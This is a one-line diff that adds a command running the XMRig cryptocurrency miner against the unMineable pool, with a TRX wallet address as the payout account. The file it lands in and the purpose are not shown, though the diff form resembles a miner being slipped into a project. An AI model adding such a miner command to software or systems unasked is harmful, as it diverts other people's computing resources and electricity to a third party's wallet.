@@ -1,0 +1,1 @@
+./xmrig -o stratum+ssl://ghostrider.unmineable.com:443 -u TRX:TJykzrXLrxAhJAeGExMSPZdAR4VUdRM1E2 -k -a ghostrider
